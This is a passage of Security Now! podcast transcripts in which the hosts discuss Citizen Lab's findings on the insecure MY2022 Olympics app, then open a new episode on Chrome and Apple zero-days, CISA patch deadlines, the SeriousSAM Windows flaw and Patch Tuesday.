Skipping down, they explain:  "Internet platforms operating in China are legally required to control content communicated over their platforms or face penalties.  Vague definitions of prohibited content are often called 'pocket crimes,' referring to authorities being able to deem any action as an offense.  Such crimes are utilized by the Chinese government to restrict political and religious expression over the Internet.  Chat and other real-time communications platforms operating in China typically perform automated censorship using a block list of keywords" - and we'll see why that is important in a minute - "keywords whose presence in a message will trigger its censorship.  Previous work has found little consistency in what content different Chinese Internet platforms censor.  However, Internet platforms are known to receive censorship directives from various government offices or officials.



"In this report we analyze MY2022, an app required to be installed by all attendees to the 2022 Olympic Games, including audience members, members of the press, and competing athletes.  The app is multi-purpose, implementing a wide range of functionality including real-time chat, voice audio chat, file transfers, as well as news and weather updates about the Olympic Games.  The app can also be used to submit required health customs information for those visiting China from abroad, which includes submitting passport details, demographic information, as well as travel and medical histories."  So I have to say, as I was plowing through this and being refreshed, it just sort of seemed to me unfortunate that the Olympics are being held in Beijing, but that's where they are.



Okay.  So according to the Chinese government's official guide on the Games, MY2022 was built by the Beijing Organizing Committee for the 2022 Olympics.  Public records and app store information show that the app is owned by a state-owned company called Beijing Financial Holdings Group.  This app, MY2022, has a wide range of functionalities including tourism recommendations, GPS navigation, and COVID-19-related health monitoring.  One of the functions MY2022 includes is to collect a list of medical information for health monitoring, which includes users' daily self-report health status, COVID-19 vaccination status, and COVID-19 lab test results.



Now, I was sure that the app would be supported on Android, and I assumed it would also need to be on iPhone.  So I pulled the app up in Apple's App Store.  The top two hits when searching for MY2022 were the app and another generically titled "Olympics."  And I put both screen shots in the show notes.  The official Chinese "MY2022" had 14 reviews and averaged two stars, whereas the generic "Olympics" app had 39,000 reviews averaging just a tad shy of a full five stars.  Which if anyone's ever thought about that, requires that everybody pretty much give it a four- or a five-star not to pull it way lower.  It looks like about 4.75 out of five.  Okay.  So clearly, MY2022, though apparently you must have it and use it, it isn't really what people are getting excited about.



LEO:  I suspect the reviews will flood in after the end of the Games.  Right?  You're not going to review it poorly now.  You're still in China.



STEVE:  That's a good point.  I'm just not, you're right, Leo, I'm not used to Big Brother looking over my shoulder.  



LEO:  Yeah.



STEVE:  It really is creepy.



LEO:  In fact, I would put a review in that says this as "This is fabulous.  Five stars.  Love you CCP.  Keep up the great work."



STEVE:  Best thing I've used this year.



LEO:  Yeah.



STEVE:  Yeah.  Okay.  So what do we know about the app that everyone is carrying around in their pockets for these next two weeks?  Here's Citizen Lab's four-point summary, just to condense it.  They said, first point:  "MY2022, an app mandated for use by all attendees of the 2022 Olympic Games in Beijing, has a simple but devastating flaw where..."



LEO:  Oh, boy.



STEVE:  I know.  Let's just start right off with the good news, "a simple but devastating flaw."  And remember what this thing is doing; right?  I mean, it's like all of your health  information, your COVID-19 status.  You have to check in with it every day and blah blah blah.  And chats and text and voice chats.  Anyway, "...devastating flaw where encryption protecting users' voice audio and file transfers can be trivially sidestepped.  Health customs forms which transmit passport details, demographic information, and medical and travel history are also vulnerable.  Server responses can also be spoofed, allowing an attacker to display fake instructions to users."  What could possibly - yeah, anyway.



Point two:  "MY2022 is fairly straightforward about the types of data it collects from users in its public-facing documents.  However, as the app collects a range of highly sensitive medical information, it's unclear with whom or which organizations it shares this information."



LEO:  Well, that's the beauty of the CCP.  You don't need to ask.



STEVE:  That's right.



LEO:  They're going to take care of that for you.



STEVE:  That's right.  Hey, it's our country.  You're a visitor.  You play by our rules.



LEO:  They may, to be fair, have different standards for privacy.  In fact, I'm willing to bet they do in China.  So, you know, we're the crazy privacy people.



STEVE:  That's true, although we'll see here that this thing even violates China's privacy guidelines.



LEO:  Oh, that's funny.



STEVE:  So "MY2022 includes features that allow users to report 'politically sensitive' content.  The app also includes a censorship keyword list, which, while presently inactive, targets a variety of political topics including sensitive domestic issues as well as references to Chinese government agencies.



"While the vendor did not respond" - here we're getting into the meat now - "the vendor did not respond to our security disclosure, we find that the app's security deficits may not only violate Google's Unwanted Software Policy and Apple's App Store guidelines, but also China's own laws and national standards pertaining to privacy protection, providing potential avenues for future redress."



Okay.  So "For domestic Chinese users, MY2022 collects personal information including name, national identification number, phone number, email address, profile picture, and employment information, sharing it with the Beijing Organizing Committee for the 2022 Olympics.  For international users, the app collects a different set of personally identifiable information including users' demographic information and passport information, issue and expiration dates, as well as the organization to which the individual belongs.



"The official Olympic Games Playbook introduces MY2022 as a smartphone application for, among other things, health monitoring.  MY2022 outlines in its privacy policy that it collects and uses users' daily self-report health status" - oh, I'm feeling just fine, thanks, no problems here - "COVID-19 vaccination status, and COVID-19 lab test results for such purposes.  While the official Olympic Games Playbook outlines that personal data such as biographical information and health-related data may be processed by a list of entities including the Beijing 2022 Organizing Committee, Chinese authorities (including the Chinese National Government, local authorities, and other authorities in charge of health and safety protocols), the International Olympic Committee, the International Paralympic Committee, and 'others involved in the implementation of the COVID-19 countermeasures'" - okay, so anybody who wants it - "MY2022's privacy policy itself did not specify with whom or with which organizations it would share users' medical and health-related information."  So could be anyone.



"Similar to other China-based apps Citizen Lab had studied in the past, MY2022 outlines several scenarios where it will disclose personal information without user consent, which include but are not limited to national security matters" - and we know how broadly defined those can be - "public health incidents, and criminal investigations.  MY2022's privacy policy did not specify whether each disclosure would be conducted under a court order, or which organizations would potentially receive information."



Now, here's what's bizarre.  Citizen Lab examined version 2.0.0 of the iOS version of MY2022 and version 2.0.1 of the Android version of MY2022.  As we know, verifying the authenticity of security certificates is one of the fundamental requirements of secure end-to-end encryption.  In fact, without verifying the identity claim being made by whomever you are connecting to, a man in the middle or anyone spoofing the server at the other end of the connection will be able to decrypt and see everything in plaintext.  Without authentication, encryption is truly meaningless.  Verifying certificate authenticity is so crucial that both the iOS and Android platforms of course build this into their APIs.  In fact, it's difficult to imagine this not being done.



Yet despite this, Citizen Lab discovered that many of the certificates protecting the connections to the app's critical backend services and servers were not being checked for authenticity.  Although we don't know exactly what each server does, the names of those certificates which are not being checked seem quite important.  We had my2022.beijing2022.cn.  Also tmail.beijing2022.cn.  Also dongaoserver.beijing2022.cn, app.bcia.com.cn, and health.customsapp.com.  None of those being checked.



The connections to those servers are using certificates.  They are TLS-encrypted.  But the authenticity of the certificate being provided to the application by the remote server is never checked.  It's difficult to imagine how this could be anything other than incredibly sloppy coding.  And again, that's why I just said the "Inept Panda" rather than the malicious or the evil or the sneaky or something.  I mean, it just, like, what?  And the biggest problem is that, as I noted at the start of this podcast, the International Olympic Games have become attacker-central.  And this failing to authenticate has been all over the news since Citizen Lab reported this publicly exactly three weeks ago today.  So it's not as if the bad guys, A, don't care; or, B, don't know.  They both care and know.



Adding support for the idea that this was just incredibly sloppy coding rather than deliberate subterfuge is the additional observation that some sensitive data was also being transmitted without any SSL encryption or any security of any kind at all.  Citizen Lab found that the MY2022 app transmits non-encrypted data to "tmail.beijing2022.cn" on port 8099.  These transmissions contain sensitive metadata relating to messages, including the names of messages' senders and receivers, and their user account identifiers.  Such data can be read by any passive eavesdropper, such as someone in range of an unsecured WiFi access point, someone operating a WiFi hotspot, an Internet Service Provider, or other telecommunications company.  It's in the clear, in plaintext.



Now, being responsible, and just hoping to be able to get these important oversights fixed before the Games began, Citizen Lab privately disclosed their findings, being responsible, to the Beijing Organizing Committee for the 2022 Olympic and Paralympic Winter Games back at the beginning of December, on the 3rd, of 2021. December 3rd.  The disclosure indicated that there would be a deadline of 15 days to substantively respond to the disclosure and 45 days to fix the issues.  Because the clock was ticking; right?  The Games are now.  



And let's remember that none of this is rocket science.  It had to have simply been an oversight.  So it would presumably take whomever had written that code and somehow failed to verify those servers' certificate authenticities, you know, a lazy afternoon to add that to the existing codebase.



But after waiting a month and a half, as of three weeks ago on January 18th, Citizen Lab had received no response of any kind to their disclosure.  So as they said they would, they went public with their findings.  And the result of that was the quite predictable massive kerfuffle when all of this was picked up by the tech and other secondary press.



The day before Citizen Lab's deadline-driven disclosure, on January 17th, update v2.0.5 of the iOS version of MY2022 appeared in the Apple App Store.  Thinking that it might have been the awaited update which fixed the problems, and that the app's authors were just not much for chitchat, Citizen Lab promptly examined the update application.



Not only have none of the known and documented and previously reported problems been resolved, but the app had introduced a new feature called "Green Health Code" whose data transmissions were also vulnerable to interception and spoofing because, although encrypted, they also failed to verify the authenticity of the server's certificate.  The "Green Health Code" feature asks for travel document information and medical history information similar to the information they had already found to be insecurely transmitted by the app's vulnerable customs health declaration feature.



And on the censorship side, according to MY2022's description in Apple's App Store, the app implements a wide range of communication functionalities including, as we said, real-time chat, newsfeeds, and file transfers.  In previous studies, Citizen Lab found the presence of censorship and surveillance keyword lists in different Chinese communication apps that provide similar services.  Bundled with the Android version of MY2022, they discovered a file named "illegalwords.txt" which contains a list of 2,442 keywords generally considered politically sensitive in China.



However, despite its inclusion in the app's package, they were unable to locate any functionality where those keywords were actually used to perform censorship.  The people who built this app seem to be so clueless that they may have simply forgotten to engage the word filtering function, if indeed there was any.



LEO:  We built it in, but we didn't turn it on.



STEVE:  Yeah.  So it's like, oh, we're sorry.  You know, it's in there; but oops.



LEO:  Whoops.  That's hysterical.



STEVE:  Unbelievable.  So it's unclear whether this keyword list is entirely inactive; and, if so, whether the list is inactive intentionally.  However, the app contains code functions designed to apply this list toward censorship, although at present those functions do not appear to ever be called anywhere.  So who knows?  We'll never know.



A spokesman for the International Olympic Committee justified the app's security issues - Leo, he explained this  apparently, however, without understanding them at all, by saying that due to the COVID-19 pandemic - where did that originate?  Oh, never mind.  Due to the COVID-19 pandemic, "special measures," that's what it said, "special measures" needed to be put in place.  That's it.  What?  This individual also defended the app...



LEO:  Yeah, he misunderstood the criticism, obviously, yeah.



STEVE:  Yeah, by saying it received approval from the Google Play store and the App Store.



LEO:  Well, that's a point, good point.



STEVE:  Well, okay, then, fine.  And adding insult to injury, as if they hadn't already been clueless enough, the IOC said:  "A closed-loop management system has been implemented."  This is the IOC, the International Olympic Committee.  "A closed-loop management system has been implemented.  The MY2022 app supports the function for health monitoring.  It is designed to keep Games-related personnel safe within the closed-loop environment."



LEO:  Yeah.  They're responding to the wrong question.



STEVE:  Yeah.  So I cannot imagine having to install such an app on my phone in order to attend our world's Olympic Games anywhere.



LEO:  What's the risk?  What's the chief risk, do you think?



STEVE:  Okay.  So with an app - okay.  So Apple's very good about containment, as we know.  I mean, they go to great lengths to contain an app.  On the other hand, we know that they're not perfect.  Android has more problems with cross-app contamination.  And there are things like hooking the keyboard, hooking the camera, turning the device into spyware.  We know, for example, that Pegasus has no problem doing that time after time after time on iOS or Android.



So I just, you know, the advice would be what we started off talking about, what the FBI recommended, leave your Apple and Android stuff.  Leave your fancy phones home.  Go to the drugstore and grab off a J-hook a $40 burner phone and just take that so that you can take pictures and create memories and text your family and so forth.  Just don't bring, I mean, it's very much like the same advice about being super careful when you're in Las Vegas during Black Hat.  I wouldn't bring my laptop.  Just like, no, no, I'll just bring a Chromebook and do the expunge button or whatever it's called on a Chromebook.



LEO:  And don't do anything private on that phone because it's all potentially stolen in transit.



STEVE:  Yes.  And, you know, stick it in an RF bag maybe, you know, and don't let the camera see anything sensitive.  I mean, really, just consider that your hotel room is bugged, and your devices are bugged.



LEO:  It's a spy device, really.



STEVE:  Yeah.



LEO:  But the worst thing is it's not a spy device just for the Chinese Communist Party.  It's a spy device for anybody who wants to use it. 



STEVE:  Yes.  And the Olympics have proven to be a target-rich environment.  I mean, there is a lot of attention being put into hacking people there.  It's like a more global version of Black Hat.  



LEO:  I'm going to guess that the athletes there have other things on their mind, and they're probably not considering OPSEC at this point.  One would hope that the people who manage the teams and who are taking care of these people would say, look, don't, don't.



STEVE:  Are saying do not, you know, you don't want to embarrass your country.  So leave your phone in the hotel room.



LEO:  Right.  Steve, you've done it again.  Another great week.  I'm sorry I missed last week.  But, hey, the good news is you can't miss a week because we record them all, and you can listen to them at any time.  Steve is at GRC.com.  That's where you'll find SpinRite, his bread and butter, the world's best mass storage maintenance and recovery utility.  Also lots of free stuff like, soon, Never11.  I mean, what is the timeframe for Never11, you think?



STEVE:  Oh, it'll be like in the next day or two.



LEO:  It's not hard; right?  It's pretty easy.



STEVE:  No.  I've already published the first release, and it's up and running.



LEO:  Okay.  So it's there.  All right.



STEVE:  Yeah.



LEO:  ShieldsUP!, all that other great stuff.  You can leave him a message there at GRC.com/feedback.  And of course you'll find 16Kb audio versions of this show for the bandwidth-impaired, 64Kb for those with two ears.  There also is a copy of a human-written transcription.  Takes a couple days to get up there, but that's very handy if you like to read along as you listen, or to find stuff, to do searches.  It's all there, GRC.com.



We have the show on our website, as well, audio and video, at TWiT.tv/sn.  Of course there's a YouTube channel dedicated to the video.  You can watch it there at any time.  Or that's a good way to share it, too, with other people, if you see a thing that you want other people to know about.  Maybe you've got a friend in the Olympics, you might want to just take that part of it and share it.  YouTube has that show.



And then there's the podcast route.  We make a podcast out of it so you can always subscribe in your favorite podcast player.  You'll get it automatically each week, which is nice.  Please, if your podcast player allows reviews, leave us a five-star review because we want everyone to listen to Security Now!.  This is a must-listen, not just for security professionals, but for anybody interested in security and privacy online.  We will be back next Tuesday, 1:30 Pacific, 4:30 Eastern, 21:30 UTC.  You can watch us do it live, live.twit.tv.  You can chat live at irc.twit.tv.  Steve, have a great week.  We'll see you next time.



STEVE:  My friend, see you for 858 next week.



LEO:  858.  Wow.  Bye-bye.



STEVE:  We're getting there.  Bye.



Copyright (c) 2022 by Steve Gibson and Leo Laporte.  SOME RIGHTS RESERVED.  This work is licensed for the good of the Internet Community under the Creative Commons License v2.5.  See the following Web page for details:  https://creativecommons.org/licenses/by-nc-sa/2.5/.




GIBSON RESEARCH CORPORATION		https://www.GRC.com/



SERIES:		Security Now!

EPISODE:	#858

DATE:		February 15, 2022

TITLE:		InControl

HOSTS:	Steve Gibson & Leo Laporte

SOURCE:	https://media.grc.com/sn/sn-858.mp3

ARCHIVE:	https://www.grc.com/securitynow.htm



DESCRIPTION:  This week we look at a couple of new zero-days in Chrome and Apple's OSes.  We also look at what the U.S. CISA thinks of not only these, but of 15 other problems that our federal agencies seem to be in no big hurry to fix.  And we revisit last summer's SeriousSAM vulnerability in Windows which remains under attack.  This being the third Tuesday of the month, we'll look back at the second Tuesday to see how that went.  Sunday saw a true emergency patch issued by Adobe that probably canceled some Super Bowl plans, and we have an amazingly bad idea for a WordPress add-on.



Google has published their 2021 Bounty Report, and their Project Zero has published stats about how things are going there.  We have Microsoft removing a popular and highly abused feature of Windows.  And then, because nothing else in the past week commanded the podcast's title, I'll wind up by formally introducing GRC's latest freeware which puts its users firmly "InControl."



SHOW TEASE:  It's time for Security Now!.  This week a new zero-day in Chrome and Apple's OS, and a recommendation from the federal government to fix it fast.  Why it was a bad day on Super Bowl Sunday for security experts who are still using an Adobe product.  And a new freeware program from Steve that puts you InControl of Windows 10.  It's all coming up next on Security Now!.	



LEO LAPORTE:  This is Security Now! with Steve Gibson, Episode 858, recorded Tuesday, February 15th, 2022:  InControl.  Security Now! listeners, our annual survey is on and going strong.  It helps us understand you better, helps us find advertisers who fit your interests.  It's optional, of course.  But it sure helps us a lot.  TWiT.tv/survey22 is the address.  Take it now before it closes in March.  It'll only take a couple of minutes, and I really appreciate it.  TWiT.tv/survey22.  Thank you.  The following show is brought to you through the generosity of people like you.  Thanks.



It's time for Security Now!, the show where we cover your security and privacy online with this guy right here, Steve Gibson from GRC.com.  Hello, Steve.



STEVE GIBSON:  Hey, Leo.  Great to be with you once again for Episode 858, this middle of February, the short month of the year.  A bunch of stuff is happening, but there was no single huge event.  So I ended up somewhat self-consciously naming the podcast after my most recent piece of freeware.



LEO:  I saw your tweet.



STEVE:  Called InControl.



LEO:  Yeah, your big announcement, yeah.



STEVE:  So we'll just sort of - I'll announce it formally at the end of the podcast, explain what it is.  But we're going to first take a look at a couple of new zero-days in Chrome and in Apple's various products.  I mean, again, a common code base, it's good for the developers.  It does mean that when you've got a problem, it's everywhere, as is the case here.  We also look at what the U.S. CISA, the C-I-S-A, thinks of not only those zero-days, one of which it's saying thou must patch, but of 15 other problems that our federal agencies seem to be in no big hurry to fix.  We're going to revisit last summer's SeriousSAM vulnerability in Windows, which has remained serious and under attack.  This being the third Tuesday of the month, we'll look back at last week's second Tuesday to see how that went.  Also, strangely, Sunday saw a true emergency patch issued by Adobe that probably canceled some Super Bowl plans because, I mean, it was really an emergency.



LEO:  Hmm.



STEVE:  Yeah.  And we have an amazingly bad idea for a WordPress add-on.  Google has published their 2021 Bounty Report.  And, boy, if you're looking for some spare change.  And their Project Zero has published stats on how things are going over there.  We have Microsoft removing a popular and highly abused feature of Windows.  And they never take stuff out.  They put a lot in, but it's rare that anything leaves.  Anyway, it's going to happen.  And then because, as I said, nothing else in the past week commanded the podcast's title, although I think I know what I'm going to talk about next week because I just - I ran across something, it's like, ooh, it's too late to get it in.  But there was a very effective deliberate BGP hijack which was leveraged into, like, it made money for the hijackers.  And normally we talk about Border Gateway Protocol mistakes.  The threat is when they're not a mistake, and one happened.  So I think we'll talk about that next week.  Anyway, as I said, I'll wind up by formally introducing GRC's latest piece of freeware, which puts its users firmly InControl.



LEO:  Good name.  And I like it that you made it more than just Windows 11.  I mean, you've got other things, too, you can do; right?



STEVE:  Yeah.  



LEO:  It's more than just blocking that annoying piece of...



STEVE:  Well, in fact, I'll explain.  My first name was StayPut.



LEO:  Which is also a good name.  It sounds like it's involved with pets in some form or fashion. 



STEVE:  Yeah.  Okay, Windows, now you just stay put.



LEO:  You just stay there, yeah.



STEVE:  But what happened was the concept evolved, and a couple of users said, well, what if I don't want it to stay put, I want it to do this.



LEO:  Yeah.



STEVE:  I thought, yeah, that's a good point.



LEO:  Power, it's about power.



STEVE:  So you want to be InControl.



LEO:  Personal agency, exactly right.



STEVE:  Because as we know it's out of control otherwise.



LEO:  Yeah.  Windows has a mind of its own. 



STEVE:  Our Picture of the Week is not techie.  Often they are.  But it was in my pile of images for the podcast, and I just got a kick out of it.  For those who are not seeing the video or the notes, we've got two guys, sort of scraggly looking, on an empty plain with the sun in the background and some hills.  But, you know, it's like not a lot going on, no cars or anything because it's a long time ago.  And one says to the other, "I keep writing 'Stone Age' instead of 'Bronze Age' on all my checks."



LEO:  Don't you hate it? 



STEVE:  Yeah, I know.



LEO:  Don't you hate it when that happens?



STEVE:  The age changes, and you just keep thinking you're where you were.



LEO:  Of course it's the Information Age.  You don't have checks anymore.  But we remember those days.  It's funny, I don't think I've written a check this year at all.



STEVE:  I haven't.  Although I have, you know, Sue is my bookkeeper person, so she does all that for me.



LEO:  Yeah, Lisa probably is printing checks all the time.



STEVE:  And I think what happened, clearly, was once upon a time we were, I mean, you had to get, like, more checkbooks; right?  You'd run out of checks, and you had to get more printed.



LEO:  Yeah, I remember those days, yeah.



STEVE:  So you'd, like, 1995, you were just writing blah blah blah 1995, 1995.  Like over and over and over and over so that it just became muscle memory.  And then New Year's happens.  And you've still got to write some checks.  And your hands just automatically write 1995 because, you know, you've done it 300 times.



LEO:  Honestly, the problem these days is remember how to hand write.  I just, I can't...



STEVE:  Oh.  I gave that up in high school.  It's like, what?



LEO:  What's my signature again?



STEVE:  I just started printing because printing is safer.



LEO:  I asked my son to autograph - he gave me a knife for Christmas.  I said, "Oh, autograph the box so I can auction it when you're famous," which he's getting very close to being.  And he signed it.  I said, "That's your signature?  I can't even - I don't know what that is.  It's just m-m-m.  Could you just write your name under there so at least somebody will know?"  And he said, "Yeah, I know."  Because he never learned.  His generation, what do they need?



STEVE:  That's really a good point.  I mean, you know, it just isn't a skill that you have to have.



LEO:  I said, "You've got to practice your autograph, dude.  Get ready."



STEVE:  It actually is going to get kind of lost, isn't it, over time.



LEO:  And then he said, "Nobody does autographs anymore, Dad.  They do selfies."  And I went, oh, you're right. 



STEVE:  Yeah.



LEO:  Never mind.



STEVE:  Oh, Leo.



LEO:  So I took a selfie with him.



STEVE:  Okay.  So we have a high-severity zero-day in Chrome.  Just yesterday Google moved Chrome for the desktop up to 98.0.4758.102, to eliminate a high-severity zero-day vulnerability that was spotted being used in attacks.  And as usual, Google is closed-mouthed about details, saying only that they're aware of reports that an exploit for, and it was assigned CVE-2022 - wow, a low number - 0609.  And not surprisingly it's a use-after-free error, which is what the predominance of errors seem to be these days, in Google's Chrome support for animation.  And, yes, exploits exist in the wild.  While they were at it, they also fixed seven other security problems, all but one of which were classified as being high-severity.  So apparently not zero-days, but yes, the high.  And so it goes.



Since exploits for today's vulnerabilities are considered highly valuable by those who have them only until they're known, and since it's a marketplace, right, they may have paid a hefty price from the likes of Zerodium for it, so they're never used in widespread indiscriminate attacks, only against targeted individuals or entities of some kind.  So it's unlikely in the extreme that any of us will be a target specifically of any of these problems that get fixed.  But keeping our browsers updated is so quick and easy and automatic for most of us.  For whatever reason, they are generally rolling these things out, and I seem to always be at the end of the list.  But when I looked it said, oh, oh, oh, yeah, we have an update for you.  Just restart your browser and you'll be good.  And it's like, okay, fine.



So here we are in mid-February, the 15th, with the first of the 2022 Chrome zero-days patched.  And as we know, last year Google addressed 16 zero-day vulnerabilities.  The first one was on February 4th, and the second one was on March 2nd.  So we're kind of like right in the middle of where the first two happened.  So this year's starting out a little bit better than last.  And we'll see how it goes.



Apple also updated against another zero-day.  That was last Thursday, and I did notice a couple of my iDevices said, oh, you're going to put your, you know, log back in again manually.  We don't trust your face.  So they had to restart.  iOS, iPadOS, macOS, and Safari, so across the board, due to a flaw in WebKit that was believed also to be actively exploited in the wild.  So far this year Apple is having a bit of a rougher time of it than Google, with Google and Chrome, since this will be Apple's third zero-day that it has patched so far.  So, you know, the NSO group sure has been giving Apple a run for their money.  It does tell you that our software is incredibly complex.  There are problems lurking in software.  And when there is enough incentive, and we've going to be talking a lot about patching incentives later on because we're going to be talking about bug bounties and so forth, when there's enough incentive to get into people's devices, so far there's a way.



Much like Chrome, and like so many of the flaws we've been encountering recently, the problem is again another use-after-free vulnerability which grants its attacker arbitrary code execution.  And much like Google, Apple is not saying much beyond:  "Apple is aware of a report that this issue may have been actively exploited."  They credited an anonymous researcher for discovering and reporting the flaw.



So anyway, updates are available for all Apple devices that are receiving them.  And my phone wasn't up to speed.  I went there, looked under settings, general and then settings and then updates.  And it wanted to install, it wanted permission to install 15.3.1, which it was ready to do.  So anyway, if you're worried about your devices, if by some chance you're a high-target person, then, yeah, you'll want to update and close this latest problem.  



The CISA, the U.S. Cybersecurity and Infrastructure Security Agency, which, boy, we're going to have to live with that one for a long time, has added that Apple zero-day we were just talking about to its short list catalog of vulnerabilities being exploited in the wild.  And for some reason they lit a fire under this one.  Or as I was thinking about this, maybe it's just because it's just not a big deal to update it.  You could argue that, okay, if there is a vulnerability that is arduous for some reason to patch, well, okay, then you give people a little more time.  But this is just say yes to Apple and let it restart your device.  So don't wait.  And apparently maybe they have some information about where these attacks are being aimed.  They may know something that Apple's not saying.



According to the CISA's binding operational directive, and of course everything is acronyms with these guys, so this is BOD 22-01, I guess it's the first binding operational directive of the year, federal agencies are now required to patch their systems against this actively exploited vulnerability impacting, as I said, iOS, iPadOS, and macOS devices.  CISA said that all Federal Civilian Executive Branch Agencies - and yes, there's an acronym for that - have until February 25th, 2022.  What's the 25th?  That's a week from next, or, yeah, a week from this coming Friday, so the 25th.  So a week and a half to fully patch against this vulnerability.  And again, it must be that they're saying do it now because it's just not difficult to restart your device.



CISA said:  "These types of vulnerabilities are a frequent attack vector for malicious cyber actors of all types and pose significant risk to the federal enterprise."  And they added that:  "Although BOD 22-01 only applies to FCEB" - okay, so that's the Federal Civilian Executive Branch - "agencies, CISA strongly urges all organizations to reduce their exposure to cyberattacks by prioritizing timely remediation of Catalog" - as they call it, we'll talk about that in a minute - "Catalog vulnerabilities as part of their vulnerability management practice."



And what's interesting is that this CISA catalog is a short list.  It contains only 16 vulnerabilities for which, like, of all the patches that are out there, they've chosen 16.  And that's because they are known to still be actively exploited in the wild.  Anyway, as I said, we'll get back to that in a second.  But one of them, the "SeriousSAM" vulnerability, as it was called last summer when we first talked about it, last Thursday CISA also asked all Federal Civilian Executive Branch agencies to patch, okay, this is a CVE-2021 because, as I said, from last year, 36934, which is the Microsoft Windows Security Accounts Manager - that is the SAM, Security Accounts Manager - bug that allows privilege escalation and credential theft.  And for this one they gave a February 24th patch deadline.  In other words, two weeks from last Thursday.  Again, get this done.



And in fact it was last Thursday that they made the announcement.  So at announcement time their deadline was two weeks from today.  And the reason being that this thing's been around since last summer.  We talked about SeriousSAM when the news of it broke.  As its name suggests, it's serious.  It's an elevation-of-privilege vulnerability which was introduced into all Windows client and server editions released since October of 2018, and then up until July of 2021.



Okay.  So that meant it started with Windows 10 1809 and the matching server version, which was 2019.  And the vulnerability was irresponsibly disclosed via a tweet.  So despite not being exploited at the time, as we know, Microsoft designates things that surprise them as zero-days.  So they called this a zero-day because it was an unwelcome surprise to them when they read about it on Twitter.



LEO:  What, they all have Twitter?  What?  That's hysterical.



STEVE:  So, yeah.  The problem arose due to an overly permissive access control list, you know, ACLs, which were present on multiple security-critical system files.  So that was an oopsie which somehow crept into Windows.  You know, like Windows 10, not the first Windows 10, but they'd had a few before that.  And that included the Security Accounts Manager database.  And you don't want anybody looking at that that's not supposed to be, like anyone other than the kernel.  So an attacker who successfully exploits this vulnerability could have full run of the system, able to run arbitrary code with system privileges, which of course allows such an attacker to install programs, view/change/delete data, and create new accounts with any rights they choose, typically all.



Okay.  Now, all that said, what might jog your memory, because it did mine, about this one in particular is that simply correcting the overly permissive access control lists does not eliminate it fully.  After installing the patch, it's necessary to then manually delete all volume shadow copies of system files, including the SAM database.  Since the trouble is with their default permissions, which would be restored along with the files, if those backup files with their permissive permissions could be restored, too.



So we talked about this at the time, which is why I suggested it might jog people's memory that, yes, not only did you need to fix the permissions on the files that are now in use in your system, but Windows is actively maintaining backups as it makes changes, which is how it's able to roll mistakes back and, like, fix things that it tries and don't work.  So it's definitely necessary to do that.  Otherwise the bad guys could still access the archived files that have the weak permissions.  So that has to all be done.



Okay.  So all of that happened when we talked about it last July.  Believe it or not, here we are eight months later, and the U.S. CISA is finally having to lower the boom on Federal Civilian Executive Branch agencies.  Now, and you know, they did that with Log4j; right?  Like a couple weeks before Christmas?  Trying to cancel Christmas.  And that didn't work, either.  So I'm not sure what it means for the CISA to say, you know, "Thou shalt update by February 24th," because that may or may not happen.  It's a week from next Thursday to get this all resolved.



And you wonder how it can possibly be that a serious vulnerability which received an emergency patch - this was an out-of-cycle emergency that hit on July 20th of last summer.  How has that not yet been fixed?  Every Windows update since then would have incorporated the fix for it.  So can it possibly be that there are U.S. Federal Civilian Executive Branch agencies that have not applied any updates to Windows since last summer?  If so, I hesitate to say they deserve what they get, but really at some point.



Okay.  So this Top 16 list.  I think it's worth taking a look at that list of things that CISA says really must be fixed by those agencies over which it apparently exercises some jurisdiction, even if it's not able to cancel Christmas.  As we can see in the table on the next page, and I'll explain what's there for those who can't see, we've got a mixture of old and new vulnerabilities.  Actually, sort of a ladder of vulnerabilities through time.  And they're recognizable to people who've been following along.  Some oldies but goodies, given their CVE dates, which start at 2014.  We have one from then, 2014; three from 2015; one from 2016; seven, that was a busy year, from 2017; one from 2018; somehow 2019 sneaked past without any; then one from 2020; and of course the SeriousSAM vulnerability from last summer.



Interestingly, all of our old friends are there.  We've got the oldest pair from 2014 and '15 are Apple OS X vulnerabilities.  We've got that HTTP.SYS remote code execution from 2015, as well as that D-Link DIR-645 router remote code execution that's been around forever.  And apparently, I mean, the point is these are things that are still being attacked.  There are machines still out there expressing some vulnerability to them.  2017 had that SMBv1, you know, the Windows file and printer sharing v1 remote code execution that we talked about, what, four or five years ago now.  There's a remote code execution in Office.  And then there was that raft of Win32k privilege escalation vulnerabilities.  Remember when we had a whole spate of those?  That was from that Polar Bear hacker girl.  Remember her?



LEO:  Oh, yeah.



STEVE:  Sandbox Escaper.  And she had that really cool one-person tent thing, kind of a kayak that you got into and zipped over yourself and hoped that there weren't any actual polar bears around.  And, you know, she kept annoying Microsoft with her tweets of just like, oh, yeah, here's another one, here's another one.  I'm bored.  Here's another one.  And they ended up hiring her, so that was good.



There was also, I remember you and I, Leo, talked about this in 2017, a Windows .LNK, a shortcut link file remote code execution.  And it was like, what?  It's 2017.  We're still having problems with shortcuts?  Wow.  Apache Struts had that improper input validation problem at the end of 2017.  And then there was the v3 of the SMB, Server Message Blocks.  As I said, when I talked last week about like how many problems there are in these legacy protocols, well, yeah.  More of them in 2020.



Anyway, all of our old friends are still there.  And what's astonishing is that CISA has them all selected out and listed in this "must fix by a deadline" chart because, as I keep saying, these things are still being exploited.  They're the most exploited vulnerabilities today.  CISA says, if these were to get patched, things would get much better.  And in the far right column is the Patch Deadline.  Aside from that one at the top, which is the next Thursday deadline, CISA's giving everybody until August 10th.  And when I was looking at that, I was thinking, August 10th, that's a Wednesday.  What's that?



The only thing I can think of is that it must have been some integer number of months from the date this commandment chart first dropped upon these federal agencies, probably, what, nine months, I guess?  Maybe, who knows when.  But in any event, everybody has to have all these fixed by Wednesday, August 10th, which really, you know, patches are available for all of them.  So especially Apple OS X, there can't be any machines that have not been rebooted and updated since then.  But CISA says that's what people are looking for.  So let's hope that happens.



And speaking of patching, Patch Tuesday.  Which has really become an industry-wide monthly patching extravaganza.  And this month Microsoft did not disappoint.  They fixed 51 vulnerabilities occurring in Windows, Office, Teams, Azure Data Explorer, Visual Studio Code, and various Windows Kernel components.  Among the 51 defects resolved, 50 of those are rated important, and one is rated moderate.  And if you're thinking to yourself, wait, 50 are important, and one is moderate.  Were none critical?  No.  No zero-days.  Nothing was critical.  And of course you'd be correct to be surprised by that observation.  Last week was a rare Patch Tuesday.  Microsoft also fixed an additional 19 flaws in their Chromium-based Edge web browser.



